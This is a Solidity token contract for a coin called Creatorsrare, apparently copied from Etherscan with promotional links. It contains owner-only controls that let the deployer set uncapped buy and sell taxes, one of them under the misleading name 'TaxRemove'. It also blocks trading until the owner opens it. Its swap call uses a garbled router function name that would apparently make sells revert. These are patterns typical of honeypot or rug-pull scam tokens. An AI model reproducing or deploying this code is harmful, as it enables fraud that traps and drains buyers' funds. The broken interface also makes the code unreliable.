/**
 *Submitted for verification at Etherscan.io on 2023-10-27
 */

/*

Telegram: https://t.me/creatorsrare_portal
Website : https://creatorsrare.com/
TwitterX: https://twitter.com/Creators_Rare

*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingtaxzzOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Creatorsrare {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    string public _name = unicode"Creatorsrare";
    string public _symbol = unicode"CREATE";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;

    uint256 buytaxzz = 5;
    uint256 selltaxzz = 5;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(routerAddress);
    address payable TOKEN_MKT;

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        TOKEN_MKT = payable(msg.sender);
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == TOKEN_MKT || to == TOKEN_MKT);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingtaxzzOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            TOKEN_MKT.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this)) {
            uint256 taxzzAmount = (amount *
                (from == pair ? buytaxzz : selltaxzz)) / 100;
            amount -= taxzzAmount;
            balanceOf[address(this)] += taxzzAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == TOKEN_MKT);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function _RemeveTax(uint256 _buy, uint256 _sell) private {
        buytaxzz = _buy;
        selltaxzz = _sell;
    }

    function TaxRemove(uint256 _buy, uint256 _sell) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        _RemeveTax(_buy, _sell);
    }
}